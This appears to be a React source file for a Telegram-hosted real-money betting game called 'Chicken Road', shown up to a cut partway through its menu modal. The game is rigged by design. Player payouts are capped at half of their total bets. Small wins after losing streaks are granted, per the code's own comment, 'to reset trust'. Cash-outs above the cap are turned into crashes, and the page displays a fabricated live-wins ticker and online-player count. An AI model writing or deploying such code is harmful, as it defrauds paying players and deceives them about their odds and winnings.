import { useState, useRef, useEffect, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { BookOpen, Menu, X, ArrowLeft } from "lucide-react";
import { useNavigate } from "react-router-dom";
import chickenImg from "@/assets/chickenroad/chicken-3d.png";
import sidewalk3dImg from "@/assets/chickenroad/sidewalk-3d.jpg";
import manholeImg from "@/assets/chickenroad/manhole.png";
import signboardImg from "@/assets/chickenroad/signboard.png";
import truckImg from "@/assets/chickenroad/truck.png";
import carImg from "@/assets/chickenroad/car.png";
import barrierImg from "@/assets/chickenroad/barrier.png";
import logoImg from "@/assets/chickenroad/logo.png";
import asphaltImg from "@/assets/chickenroad/asphalt.jpg";
import {
  playBetSound,
  playWinSound,
  playLoseSound,
  playResultReveal,
  startBgMusic,
  stopBgMusic,
} from "@/hooks/useGameSounds";
import { useBalanceContext } from "@/contexts/BalanceContext";
import { reportGameResult, getTelegram } from "@/lib/telegram";
import GameCurrencyChips from "@/components/GameCurrencyChips";
import { GameCurrencyMode, WalletKind, modeToWallet, toNativeAmount, currencySymbol } from "@/lib/gameCurrency";
import { toast } from "@/hooks/use-toast";

type TelegramWebApp = {
  ready?: () => void;
  expand?: () => void;
  requestFullscreen?: () => void;
  disableVerticalSwipes?: () => void;
};

// ============= RIGGING (heavy house edge, believable pattern) =============
// Tracks lifetime bets/wins per user+currency in localStorage.
// Rules:
//  - Keep RTP low, but never let users see impossible-looking 20–30 loss streaks.
//  - After repeated losses, allow a tiny early cashout to reset trust.
//  - Deep lanes remain dangerous, so large payouts are still rare.
type RigStats = {
  totalBet: number;
  totalWin: number;
  games: number;
  lossStreak: number;
  winStreak: number;
};
const DEFAULT_RIG: RigStats = { totalBet: 0, totalWin: 0, games: 0, lossStreak: 0, winStreak: 0 };
const rigKey = (currency: WalletKind) => {
  const uid = getTelegram()?.initDataUnsafe?.user?.id ?? "demo";
  return `chickenroad_rig_${uid}_${currency}`;
};
const readRig = (currency: WalletKind): RigStats => {
  try {
    const raw = localStorage.getItem(rigKey(currency));
    if (raw) return { ...DEFAULT_RIG, ...JSON.parse(raw) };
  } catch {
    return { ...DEFAULT_RIG };
  }
  return { ...DEFAULT_RIG };
};
const writeRig = (currency: WalletKind, s: RigStats) => {
  try { localStorage.setItem(rigKey(currency), JSON.stringify(s)); } catch { return; }
};
const floorMoney = (value: number) => Math.floor(value * 100) / 100;
const getAllowedWinCap = (stats: RigStats, betAmount: number) => {
  // Admin keeps ~50% of net losses; user can win back the other half as payouts.
  // i.e. cumulative payouts <= 0.5 * totalBet  =>  remaining allowed = 0.5*totalBet - totalWin
  const rtpCap = Math.max(0, 0.5 * stats.totalBet - stats.totalWin);
  // Mercy: after losses, ensure the user actually sees a meaningful win
  // 2+ losses -> up to 2x bet payout, 5+ losses -> up to 2.5x bet payout
  const mercyCap = stats.lossStreak >= 5
    ? betAmount * 2.5
    : stats.lossStreak >= 3
      ? betAmount * 2.2
      : stats.lossStreak >= 2
        ? betAmount * 2.0
        : 0;
  return Math.max(rtpCap, mercyCap);
};

type Difficulty = "easy" | "medium" | "hard" | "hardcore";
type Phase = "betting" | "playing" | "lost" | "cashed";

const DIFFICULTY_CONFIG: Record<
  Difficulty,
  { multipliers: number[]; crashBase: number; label: string; color: string; ring: string }
> = {
  easy: {
    multipliers: [1.03, 1.07, 1.12, 1.17, 1.24, 1.33, 1.44, 1.58, 1.75, 1.96, 2.23, 2.55, 2.96, 3.48, 4.13, 4.97, 6.03, 7.42, 9.22, 11.60, 14.76, 19.00],
    crashBase: 0.05,
    label: "Easy",
    color: "hsl(140 75% 50%)",
    ring: "hsl(140 90% 65%)",
  },
  medium: {
    multipliers: [1.12, 1.28, 1.46, 1.67, 2.64, 5.81, 17.79, 75.65, 447, 1700],
    crashBase: 0.18,
    label: "Medium",
    color: "hsl(210 90% 55%)",
    ring: "hsl(210 95% 70%)",
  },
  hard: {
    multipliers: [1.23, 1.55, 1.97, 2.50, 4.33, 10.21, 32.75, 143.0, 850.4, 6885, 40899],
    crashBase: 0.28,
    label: "Hard",
    color: "hsl(28 95% 55%)",
    ring: "hsl(28 100% 68%)",
  },
  hardcore: {
    multipliers: [1.61, 2.77, 4.90, 8.67, 25.01, 117.7, 903.6, 11314, 231066, 2516310],
    crashBase: 0.45,
    label: "Hardcore",
    color: "hsl(0 85% 55%)",
    ring: "hsl(0 95% 68%)",
  },
};

const BET_PRESETS = [0.5, 1, 2, 7];

const ChickenRoadGame = () => {
  const navigate = useNavigate();
  const [soundOn, setSoundOn] = useState(true);
  const soundRef = useRef(true);
  useEffect(() => {
    soundRef.current = soundOn;
  }, [soundOn]);

  // Auto full-screen inside Telegram Mini App
  useEffect(() => {
    const tg = (window as Window & { Telegram?: { WebApp?: TelegramWebApp } }).Telegram?.WebApp;
    const safeTelegramCall = (callback?: () => void) => {
      try { callback?.(); } catch { return; }
    };
    if (tg) {
      safeTelegramCall(tg.ready);
      safeTelegramCall(tg.expand);
      safeTelegramCall(tg.requestFullscreen);
      safeTelegramCall(tg.disableVerticalSwipes);
    }
  }, []);

  const { dollarBalance, rupeeBalance, starBalance, dollarWinning, rupeeWinning, starWinning, refreshBalance } =
    useBalanceContext();
  const [localDollarAdj, setLocalDollarAdj] = useState(0);
  const [localRupeeAdj, setLocalRupeeAdj] = useState(0);
  const [localStarAdj, setLocalStarAdj] = useState(0);
  const gameDollarBalance = dollarBalance + dollarWinning + localDollarAdj;
  const gameRupeeBalance = rupeeBalance + rupeeWinning + localRupeeAdj;
  const gameStarBalance = starBalance + starWinning + localStarAdj;

  const [currencyMode, setCurrencyMode] = useState<GameCurrencyMode>("USD");
  const activeWallet = modeToWallet(currencyMode);
  const [selectedBet, setSelectedBet] = useState(1);
  const [difficulty, setDifficulty] = useState<Difficulty>("easy");
  const [phase, setPhase] = useState<Phase>("betting");
  const [currentLane, setCurrentLane] = useState(0);
  const [carLane, setCarLane] = useState<number | null>(null);
  const [winAmount, setWinAmount] = useState(0);
  const [menuOpen, setMenuOpen] = useState(false);
  const [howOpen, setHowOpen] = useState(false);

  useEffect(() => {
    if (soundOn) startBgMusic();
    else stopBgMusic();
    return () => stopBgMusic();
  }, [soundOn]);

  const cfg = DIFFICULTY_CONFIG[difficulty];
  const nativeBalance = activeWallet === "dollar" ? gameDollarBalance : activeWallet === "rupee" ? gameRupeeBalance : gameStarBalance;
  const currentBalance = nativeBalance;
  const nBet = (v: number) => toNativeAmount(v, currencyMode);
  const currentMultiplier = currentLane > 0 ? cfg.multipliers[currentLane - 1] : 0;
  const nextMultiplier =
    currentLane < cfg.multipliers.length ? cfg.multipliers[currentLane] : cfg.multipliers[cfg.multipliers.length - 1];

  const startGame = useCallback(() => {
    if (currentBalance < selectedBet) {
      toast({
        title: "Insufficient balance",
        description: `Need ${currencyMode === "USD" ? "$" : currencyMode === "INR" ? "₹" : ""}${selectedBet}${
          activeWallet === "star" ? " ⭐" : ""
        } to play`,
        variant: "destructive",
      });
      return;
    }
    if (activeWallet === "dollar") setLocalDollarAdj((p) => p - nBet(selectedBet));
    else if (activeWallet === "rupee") setLocalRupeeAdj((p) => p - nBet(selectedBet));
    else setLocalStarAdj((p) => p - nBet(selectedBet));
    if (soundRef.current) playBetSound();

    // ===== RIG: record this bet =====
    const s = readRig(activeWallet);
    s.totalBet += selectedBet;
    s.games += 1;
    writeRig(activeWallet, s);

    setCurrentLane(0);
    setCarLane(null);
    setWinAmount(0);
    setPhase("playing");
  }, [currentBalance, selectedBet, activeWallet]);

  const finalizeLoss = useCallback((crashLane: number) => {
    const s = readRig(activeWallet);
    s.lossStreak += 1;
    s.winStreak = 0;
    writeRig(activeWallet, s);

    setCurrentLane(crashLane);
    setCarLane(crashLane);
    setPhase("lost");
    if (soundRef.current) playLoseSound();
    reportGameResult({
      betAmount: nBet(selectedBet),
      winAmount: 0,
      currency: activeWallet,
      game: "chickenroad",
    })
      .then(() => {
        setLocalDollarAdj(0);
        setLocalRupeeAdj(0);
        setLocalStarAdj(0);
        refreshBalance();
      })
      .catch(console.error);
  }, [selectedBet, activeWallet, refreshBalance]);

  const finalizeWin = useCallback((prize: number) => {
    setWinAmount(prize);
    setPhase("cashed");
    if (soundRef.current) playWinSound();
    // ===== RIG: record win =====
    const s = readRig(activeWallet);
    s.totalWin += prize;
    s.lossStreak = 0;
    s.winStreak += 1;
    writeRig(activeWallet, s);
    reportGameResult({
      betAmount: nBet(selectedBet),
      winAmount: nBet(prize),
      currency: activeWallet,
      game: "chickenroad",
    })
      .then(() => {
        setLocalDollarAdj(0);
        setLocalRupeeAdj(0);
        setLocalStarAdj(0);
        refreshBalance();
      })
      .catch(console.error);
  }, [selectedBet, activeWallet, refreshBalance]);

  const goNext = useCallback(() => {
    if (phase === "betting") {
      startGame();
      return;
    }
    if (phase !== "playing") return;
    if (currentLane >= cfg.multipliers.length) return;

    // ===== RIG decision =====
    const stats = readRig(activeWallet);
    // Cap keeps lifetime RTP low, with a small mercy window after loss streaks.
    const cap = getAllowedWinCap(stats, selectedBet);
    // Payout if player advances to next lane
    const nextPayout = floorMoney(selectedBet * cfg.multipliers[currentLane]);
    // Per-step random crash chance, rises sharply with lane progression.
    // Lane 0→1 fairly safe (small win possible), deeper lanes very risky.
    const streakRelief = stats.lossStreak >= 2 ? 0.55 : stats.lossStreak >= 1 ? 0.2 : 0;
    const winCooldown = stats.winStreak >= 2 ? 0.25 : stats.winStreak === 1 ? 0.1 : 0;
    const stepRisk = Math.min(0.9, Math.max(0.04, cfg.crashBase + currentLane * 0.14 + winCooldown - streakRelief));
    // After losses, give the user a guaranteed mercy step (up to lane 1-2) as long as payout fits the cap
    const mercyLanes = stats.lossStreak >= 5 ? 2 : stats.lossStreak >= 2 ? 1 : 0;
    const forceMercyStep = currentLane < mercyLanes && nextPayout <= cap;
    const randomCrash = !forceMercyStep && Math.random() < stepRisk;

    const mustCrash = nextPayout > cap || randomCrash;

    if (mustCrash) {
      const crashLane = currentLane + 1;
      finalizeLoss(crashLane);
      return;
    }

    const newLane = currentLane + 1;
    setCurrentLane(newLane);
    if (soundRef.current) playResultReveal();

    if (newLane >= cfg.multipliers.length) {
      const mult = cfg.multipliers[cfg.multipliers.length - 1];
      const prize = floorMoney(selectedBet * mult);
      finalizeWin(prize);
    }
  }, [phase, currentLane, cfg, selectedBet, activeWallet, startGame, finalizeLoss, finalizeWin]);

  const cashOut = useCallback(() => {
    if (phase !== "playing" || currentLane === 0) return;
    const mult = cfg.multipliers[currentLane - 1];
    const prize = floorMoney(selectedBet * mult);

    // ===== RIG: cannot cash out above cap =====
    const stats = readRig(activeWallet);
    const cap = getAllowedWinCap(stats, selectedBet);
    if (prize > cap) {
      // Truck takes the chicken before it escapes
      finalizeLoss(currentLane);
      return;
    }

    finalizeWin(prize);
  }, [phase, currentLane, cfg, selectedBet, activeWallet, finalizeLoss, finalizeWin]);

  const resetToBet = () => {
    setPhase("betting");
    setCurrentLane(0);
    setCarLane(null);
    setWinAmount(0);
  };

  // Auto-reset to betting after a loss so the player lands back at the start
  useEffect(() => {
    if (phase !== "lost") return;
    const t = setTimeout(() => {
      setPhase("betting");
      setCurrentLane(0);
      setCarLane(null);
      setWinAmount(0);
    }, 2200);
    return () => clearTimeout(t);
  }, [phase]);

  const fmt = (n: number) =>
    activeWallet === "star" ? `${n.toFixed(2)} ⭐` : `${currencySymbol(currencyMode)}${n.toFixed(2)}`;
  const potentialWin = currentLane > 0 ? selectedBet * currentMultiplier : selectedBet * nextMultiplier;

  // Smooth scrolling track: render ALL lanes, translate horizontally as chicken advances.
  const VISIBLE_LANES = 6;
  const totalLanes = cfg.multipliers.length;
  const scrollIndex = Math.max(
    0,
    Math.min(currentLane - 1, Math.max(0, totalLanes - VISIBLE_LANES))
  );
  const trackWidthPct = (totalLanes / VISIBLE_LANES) * 100;
  const laneWidthPct = 100 / totalLanes; // within track
  const translatePct = -scrollIndex * laneWidthPct;

  return (
    <div
      className="min-h-screen flex flex-col select-none"
      style={{
        background: "linear-gradient(180deg, #0a0a0f 0%, #050507 100%)",
        paddingTop: "calc(env(safe-area-inset-top, 0px) + 56px)",
      }}
    >
      {/* ============ TOP BAR ============ */}
      <div
        className="flex items-center justify-between gap-1.5 px-2 py-2"
        style={{ background: "#0a0a0f" }}
      >
        {/* Back */}
        <button
          onClick={() => navigate("/")}
          aria-label="Back"
          className="h-9 w-9 rounded-xl flex items-center justify-center shrink-0 active:scale-95"
          style={{ background: "#15161c", border: "1px solid #2a2c36", color: "#cfd2dc" }}
        >
          <ArrowLeft className="h-4 w-4" />
        </button>

        {/* Logo */}
        <button onClick={() => navigate("/")} className="shrink-0 active:scale-95 transition-transform">
          <img
            src={logoImg}
            alt="Chicken Road"
            className="h-9 w-auto"
            style={{ filter: "drop-shadow(0 0 8px rgba(255,120,30,0.5))" }}
          />
        </button>

        {/* How to play (icon only) */}
        <button
          onClick={() => setHowOpen(true)}
          aria-label="How to play"
          className="h-9 w-9 rounded-xl flex items-center justify-center shrink-0"
          style={{ background: "#15161c", border: "1px solid #2a2c36", color: "#cfd2dc" }}
        >
          <BookOpen className="h-4 w-4" />
        </button>

        {/* Currency chips: $ / ₹ / ★ */}
        <div className="ml-auto">
          <GameCurrencyChips mode={currencyMode} onChange={setCurrencyMode} disabled={phase === "playing"} />
        </div>

        {/* Menu */}
        <button
          onClick={() => setMenuOpen(true)}
          className="h-9 w-9 rounded-xl flex items-center justify-center shrink-0"
          style={{ background: "#15161c", border: "1px solid #2a2c36", color: "#cfd2dc" }}
        >
          <Menu className="h-4 w-4" />
        </button>
      </div>

      {/* ============ LIVE WINS TICKER ============ */}
      <div
        className="px-3 py-1.5 flex items-center gap-2 overflow-hidden text-[10px] border-y"
        style={{ background: "#07080b", borderColor: "#15171d" }}
      >
        <span className="flex items-center gap-1 shrink-0">
          <span className="h-1.5 w-1.5 rounded-full inline-block animate-pulse" style={{ background: "hsl(140 75% 55%)" }} />
          <span style={{ color: "#9aa0ab" }}>Live wins</span>
        </span>
        <span className="shrink-0" style={{ color: "#3e4250" }}>|</span>
        <span className="shrink-0" style={{ color: "#9aa0ab" }}>
          Online: <span style={{ color: "hsl(140 75% 60%)" }} className="font-bold">33,386</span>
        </span>
        <div className="flex-1 overflow-hidden whitespace-nowrap">
          <motion.div
            animate={{ x: ["100%", "-100%"] }}
            transition={{ duration: 28, repeat: Infinity, ease: "linear" }}
            className="flex gap-5 inline-block"
          >
            {[
              { n: "Blush Comp...", a: "+$160.00" },
              { n: "LuckyMike", a: "+$98.50" },
              { n: "QueenB", a: "+$75.20" },
              { n: "JohnnyX", a: "+$52.00" },
              { n: "MaxPwr", a: "+$230.00" },
            ].map((t, i) => (
              <span key={i} className="inline-flex items-center gap-1">
                <span style={{ color: "hsl(45 90% 60%)" }}>⭐</span>
                <span style={{ color: "#cfd2dc" }}>{t.n}</span>
                <span style={{ color: "hsl(140 75% 60%)" }} className="font-bold">{t.a}</span>
                <span style={{ color: "#3e4250" }}>•</span>
              </span>
            ))}
          </motion.div>
        </div>
      </div>

      {/* ============ ROAD PLAY AREA ============ */}
      <div
        className="relative flex-1 overflow-hidden"
        style={{ background: "#1a1c1e", perspective: "1200px" }}
      >
        {/* Realistic 3D asphalt texture */}
        <div
          className="absolute inset-0"
          style={{
            backgroundImage: `url(${asphaltImg})`,
            backgroundRepeat: "repeat",
            backgroundSize: "320px 480px",
            filter: "brightness(0.7) contrast(1.05) saturate(0.6) hue-rotate(-20deg)",
          }}
        />
        <div
          className="absolute inset-0 pointer-events-none"
          style={{
            background:
              "radial-gradient(ellipse at 50% 30%, rgba(255,255,255,0.08), transparent 75%), linear-gradient(180deg, rgba(0,0,0,0.15) 0%, rgba(0,0,0,0.4) 100%)",
          }}
        />

        {/* Subtle 3D tilt wrapper */}
        <div
          className="absolute inset-0 flex"
          style={{
            transform: "rotateX(6deg)",
            transformOrigin: "50% 100%",
            transformStyle: "preserve-3d",
          }}
        >
          {/* Sidewalk left (fixed) — 3D rendered scene background */}
          <div
            className="shrink-0 relative h-full overflow-hidden"
            style={{
              width: "24%",
              backgroundImage: `url(${sidewalk3dImg})`,
              backgroundSize: "cover",
              backgroundPosition: "center top",
              backgroundRepeat: "no-repeat",
              borderRight: "4px solid rgba(0,0,0,0.55)",
              boxShadow:
                "inset -10px 0 18px rgba(0,0,0,0.4), inset 4px 0 10px rgba(255,255,255,0.08)",
              zIndex: 5,
            }}
          >
            {/* Soft vignette for depth */}
            <div
              className="absolute inset-0 pointer-events-none"
              style={{
                background:
                  "linear-gradient(180deg, rgba(0,0,0,0.15) 0%, transparent 30%, transparent 70%, rgba(0,0,0,0.25) 100%)",
              }}
            />

            {/* Chicken on sidewalk (before first lane) */}
            {currentLane === 0 && phase !== "lost" && (
              <div className="absolute left-1/2 -translate-x-1/2 bottom-12 z-20">
                <ChickenOnManhole jumpKey={currentLane} />
              </div>
            )}
          </div>

          {/* Scrollable lanes viewport */}
          <div className="flex-1 relative h-full overflow-hidden">
            <motion.div
              className="absolute inset-y-0 left-0 flex"
              style={{ width: `${trackWidthPct}%` }}
              animate={{ x: `${translatePct}%` }}
              transition={{ type: "spring", stiffness: 120, damping: 22, mass: 0.7 }}
            >
              {cfg.multipliers.map((mult, idx) => {
                const laneNumber = idx + 1;
                const isCrossed = currentLane >= laneNumber;
                const isCurrent = currentLane === laneNumber && phase === "playing";
                const isCrashLane = carLane === laneNumber;
                const isNextLane = currentLane === laneNumber - 1 && phase === "playing";
                const isSignLane = idx === 0 && currentLane === 0 && phase === "betting";
                const showSignboard = (isNextLane && !isCrossed) || (isSignLane && laneNumber === 1);
                const isLast = idx === cfg.multipliers.length - 1;

                return (
                  <div
                    key={laneNumber}
                    className="relative h-full shrink-0"
                    style={{ width: `${laneWidthPct}%` }}
                  >
                    {/* Dashed lane divider */}
                    {!isLast && (
                      <div
                        className="absolute top-0 bottom-0 pointer-events-none"
                        style={{
                          right: 0,
                          width: "3px",
                          backgroundImage:
                            "linear-gradient(180deg, rgba(255,255,255,0.85) 50%, transparent 50%)",
                          backgroundSize: "100% 36px",
                        }}
                      />
                    )}

                    {/* Crash truck — drives all the way down over chicken */}
                    <AnimatePresence>
                      {isCrashLane && (
                        <motion.div
                          initial={{ top: "-40%" }}
                          animate={{ top: "130%" }}
                          transition={{ duration: 1.1, ease: "easeIn" }}
                          className="absolute left-1/2 -translate-x-1/2 z-30"
                        >
                          <Truck />
                        </motion.div>
                      )}
                    </AnimatePresence>

                    {/* Ambient traffic on non-visible-edge upcoming lanes */}
                    {!isCrashLane && phase !== "lost" && !isCrossed && !isCurrent && (
                      (() => {
                        const offset = laneNumber - currentLane;
                        if (offset === 2) {
                          return (
                            <motion.div
                              animate={{ top: ["-20%", "110%"] }}
                              transition={{ duration: 0.9, repeat: Infinity, ease: "linear", delay: 0.1 }}
                              className="absolute left-1/2 -translate-x-1/2 z-10"
                            >
                              <Car />
                            </motion.div>
                          );
                        }
                        if (offset === 3) {
                          return (
                            <motion.div
                              animate={{ top: ["-25%", "110%"] }}
                              transition={{ duration: 1.1, repeat: Infinity, ease: "linear", delay: 0.5 }}
                              className="absolute left-1/2 -translate-x-1/2 z-10"
                            >
                              <Truck />
                            </motion.div>
                          );
                        }
                        if (offset === 4) {
                          return (
                            <motion.div
                              animate={{ top: ["-30%", "110%"] }}
                              transition={{ duration: 0.8, repeat: Infinity, ease: "linear", delay: 0.3 }}
                              className="absolute left-1/2 -translate-x-1/2 z-10"
                            >
                              <Car />
                            </motion.div>
                          );
                        }
                        if (offset === 5) {
                          return (
                            <motion.div
                              animate={{ top: ["-15%", "110%"] }}
                              transition={{ duration: 1.0, repeat: Infinity, ease: "linear", delay: 0.8 }}
                              className="absolute left-1/2 -translate-x-1/2 z-10"
                            >
                              <Truck />
                            </motion.div>
                          );
                        }
                        return null;
                      })()
                    )}

                    {/* Chicken on this lane (also stays during crash animation) */}
                    {currentLane === laneNumber && (phase === "playing" || phase === "lost") && (
                      <div className="absolute left-0 right-0 bottom-10 z-20 flex justify-center pointer-events-none">
                        <ChickenOnManhole jumpKey={currentLane} />
                      </div>
                    )}
                    {/* Full-width barrier across the lane at chicken's row */}
                    {isCurrent && (
                      <motion.div
                        key={`near-barrier-${currentLane}`}
                        initial={{ scale: 0.85, opacity: 0, y: -8 }}
                        animate={{ scale: 1, opacity: 1, y: 0 }}
                        transition={{ type: "spring", stiffness: 220, damping: 16 }}
                        className="absolute left-0 right-0 pointer-events-none flex justify-center"
                        style={{ bottom: 52, zIndex: 19 }}
                      >
                        <img
                          src={barrierImg}
                          alt=""
                          style={{
                            width: "100%",
                            height: "auto",
                            objectFit: "fill",
                            filter:
                              "drop-shadow(0 6px 8px rgba(0,0,0,0.7)) drop-shadow(0 0 5px rgba(255,180,40,0.35))",
                          }}
                          loading="lazy"
                        />
                      </motion.div>
                    )}

                    {/* Crash splat */}
                    {currentLane === laneNumber - 1 && phase === "lost" && carLane === laneNumber && (
                      <motion.div
                        initial={{ scale: 1, opacity: 1 }}
                        animate={{ scale: [1, 1.4, 0.8], opacity: [1, 1, 0] }}
                        transition={{ duration: 1 }}
                        className="absolute left-1/2 -translate-x-1/2 bottom-12 text-4xl z-30"
                      >
                        💥
                      </motion.div>
                    )}

                    {/* Barrier on crossed lanes (3D pop) */}
                    {isCrossed && !isCurrent && (
                      <motion.div
                        initial={{ scale: 0.5, opacity: 0, y: -10 }}
                        animate={{ scale: 1, opacity: 1, y: 0 }}
                        transition={{ type: "spring", stiffness: 220, damping: 15 }}
                        className="absolute left-0 right-0 top-1/3 flex justify-center pointer-events-none z-20"
                      >
                        <img
                          src={barrierImg}
                          alt=""
                          className="w-[68px] h-auto"
                          style={{
                            filter:
                              "drop-shadow(0 8px 10px rgba(0,0,0,0.75)) drop-shadow(0 0 6px rgba(255,180,40,0.35))",
                            transform: "translateZ(20px)",
                          }}
                          loading="lazy"
                        />
                      </motion.div>
                    )}

                    {/* Multiplier marker at lane bottom */}
                    <div className="absolute left-0 right-0 bottom-10 flex justify-center pointer-events-none">
                      {!isCrossed && (
                        <ManholeCover
                          label={mult >= 100 ? `${mult.toFixed(0)}x` : `${mult.toFixed(2)}x`}
                          crossed={false}
                        />
                      )}
                    </div>
                  </div>
                );
              })}
            </motion.div>
          </div>
        </div>

        {/* Status overlay top */}
        <AnimatePresence>
          {phase === "playing" && currentLane > 0 && (
            <motion.div
              key="winbox"
              initial={{ y: -30, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              exit={{ y: -30, opacity: 0 }}
              className="absolute top-2 left-1/2 -translate-x-1/2 px-3 py-1 rounded-full text-xs font-black"
              style={{
                background: "linear-gradient(135deg, hsl(140 75% 45%), hsl(150 70% 38%))",
                color: "white",
                boxShadow: "0 0 18px hsla(140,80%,50%,0.55)",
                border: "1.5px solid hsl(140 90% 65%)",
              }}
            >
              {currentMultiplier.toFixed(2)}x · {fmt(selectedBet * currentMultiplier)}
            </motion.div>
          )}
          {phase === "lost" && (
            <motion.div
              key="lostbox"
              initial={{ scale: 0 }}
              animate={{ scale: 1 }}
              className="absolute top-2 left-1/2 -translate-x-1/2 px-3 py-1 rounded-full text-xs font-black"
              style={{
                background: "linear-gradient(135deg, hsl(0 85% 50%), hsl(15 80% 45%))",
                color: "white",
                boxShadow: "0 0 18px hsla(0,85%,50%,0.6)",
              }}
            >
              💥 SHOT DOWN
            </motion.div>
          )}
          {phase === "cashed" && (
            <motion.div
              key="cashbox"
              initial={{ scale: 0 }}
              animate={{ scale: 1 }}
              className="absolute top-2 left-1/2 -translate-x-1/2 px-3 py-1 rounded-full text-xs font-black"
              style={{
                background: "linear-gradient(135deg, hsl(45 95% 55%), hsl(28 90% 50%))",
                color: "#1a120a",
                boxShadow: "0 0 18px hsla(45,95%,55%,0.65)",
              }}
            >
              🏆 WON {fmt(winAmount)}
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* ============ BOTTOM CONTROL PANEL ============ */}
      <div className="px-3 pt-3 pb-3 space-y-2" style={{ background: "#0a0b10" }}>
        {/* Row 1: MIN | value | MAX */}
        <div
          className="rounded-2xl p-1.5 flex items-center gap-1.5"
          style={{ background: "#2b2f3d", border: "1px solid #1d2029" }}
        >
          <button
            onClick={() => setSelectedBet(0.5)}
            className="h-12 px-4 rounded-xl text-[13px] font-black"
            style={{ background: "#3a3f50", color: "#eaecf2" }}
          >
            MIN
          </button>
          <div className="flex-1 text-center text-[18px] font-black" style={{ color: "#eaecf2" }}>
            {selectedBet < 1 ? selectedBet.toFixed(2) : selectedBet.toFixed(0)}
          </div>
          <button
            onClick={() => setSelectedBet(Math.max(0.5, Math.floor(currentBalance)))}
            className="h-12 px-4 rounded-xl text-[13px] font-black"
            style={{ background: "#3a3f50", color: "#eaecf2" }}
          >
            MAX
          </button>
        </div>

        {/* Row 2: bet presets */}
        <div className="grid grid-cols-4 gap-1.5">
          {BET_PRESETS.map((bet) => {
            const active = selectedBet === bet;
            return (
              <button
                key={bet}
                onClick={() => setSelectedBet(bet)}
                className="h-14 rounded-2xl text-[15px] font-black flex items-center justify-center gap-1.5"
                style={{
                  background: "#2b2f3d",
                  border: active ? "1.5px solid #ffd84a" : "1px solid #1d2029",
                  color: "#eaecf2",
                  boxShadow: active ? "0 0 10px rgba(255,216,74,0.45)" : "none",
                }}
              >
                {bet}
                <span
                  className="h-6 w-6 rounded-full flex items-center justify-center text-[12px] font-black"
                  style={{
                    background: activeWallet === "dollar" ? "#ffffff" : "#ffd84a",
                    color: "#1a1d26",
                  }}
                >
                  {currencyMode === "USD" ? "$" : currencyMode === "INR" ? "₹" : "⭐"}
                </span>
              </button>
            );
          })}
        </div>

        {/* Row 3: Difficulty pills */}
        <div className="grid grid-cols-4 gap-1.5">
          {(Object.keys(DIFFICULTY_CONFIG) as Difficulty[]).map((d) => {
            const active = difficulty === d;
            const c = DIFFICULTY_CONFIG[d];
            return (
              <button
                key={d}
                onClick={() => setDifficulty(d)}
                disabled={phase === "playing"}
                className="h-12 rounded-2xl text-[13px] font-black"
                style={{
                  background: "#2b2f3d",
                  border: active ? `1.5px solid ${c.ring}` : "1px solid #1d2029",
                  color: active ? c.ring : "#eaecf2",
                  boxShadow: active ? `0 0 10px ${c.color}88` : "none",
                  opacity: phase === "playing" ? 0.5 : 1,
                }}
              >
                {c.label}
              </button>
            );
          })}
        </div>


        {/* Row 5: Cash Out + Play */}
        <div className="flex items-center gap-1.5">
          {phase === "playing" && currentLane > 0 && (
            <motion.button
              whileTap={{ scale: 0.95 }}
              onClick={cashOut}
              className="h-14 px-3 rounded-2xl font-black flex flex-col items-center justify-center shrink-0"
              style={{
                minWidth: 96,
                background: "linear-gradient(180deg, #ffd84a 0%, #e89a1d 100%)",
                color: "#1a120a",
                border: "1.5px solid #ffe87a",
                boxShadow: "0 0 18px rgba(232,154,29,0.55), inset 0 -3px 0 rgba(120,60,0,0.5)",
              }}
            >
              <div className="text-[9px] tracking-wider">CASH OUT</div>
              <div className="text-[14px] leading-tight">
                {(selectedBet * currentMultiplier).toFixed(0)} {currencyMode === "USD" ? "$" : currencyMode === "INR" ? "₹" : "⭐"}
              </div>
            </motion.button>
          )}

          <motion.button
            whileTap={{ scale: 0.95 }}
            onClick={phase === "betting" ? startGame : phase === "playing" ? goNext : resetToBet}
            className="flex-1 h-14 rounded-2xl font-black text-[22px]"
            style={{
              background: "linear-gradient(180deg, #44d96a 0%, #1f9c3e 100%)",
              color: "white",
              border: "1.5px solid #6df08a",
              boxShadow: "0 0 18px rgba(31,156,62,0.55), inset 0 -3px 0 rgba(0,60,15,0.5)",
              textShadow: "0 2px 0 rgba(0,0,0,0.35)",
            }}
          >
            {phase === "playing" ? "Go" : phase === "betting" ? "Play" : "Reset"}
          </motion.button>
        </div>

      </div>

      {/* ============ HOW TO PLAY MODAL ============ */}
      <AnimatePresence>
        {howOpen && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4"
            style={{ background: "rgba(0,0,0,0.75)" }}
            onClick={() => setHowOpen(false)}
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="max-w-sm w-full rounded-2xl p-4 relative"
              style={{ background: "#101218", border: "1px solid #2a2c36", color: "#eaecf2" }}
              onClick={(e) => e.stopPropagation()}
            >
              <button onClick={() => setHowOpen(false)} className="absolute right-3 top-3">
                <X className="h-5 w-5" />
              </button>
              <h2 className="font-black text-lg mb-2">How to play</h2>
              <ol className="text-[12px] space-y-1.5 list-decimal pl-4" style={{ color: "#cfd2dc" }}>
                <li>Pick a bet amount and a Difficulty.</li>
                <li>Press <b>GO</b> — the chicken hops one lane forward.</li>
                <li>Each lane has a multiplier. Cash out before a vehicle hits!</li>
                <li>Higher difficulty = bigger multipliers but more risk.</li>
              </ol>
            </motion.div>
          </motion.div>
        )}
        {menuOpen && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4"
            style={{ background: "rgba(0,0,0,0.75)" }}
            onClick={() => setMenuOpen(false)}
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="max-w-sm w-full rounded-2xl p-3 relative"
              style={{ background: "#101218", border: "1px solid #2a2c36", color: "#eaecf2" }}
              onClick={(e) => e.stopPropagation()}
            >
              <button onClick={() => setMenuOpen(false)} className="absolute right-3 top-3">
                <X className="h-5 w-5" />
              </button>
              <h2 className="font-black text-lg mb-2">Menu</h2>
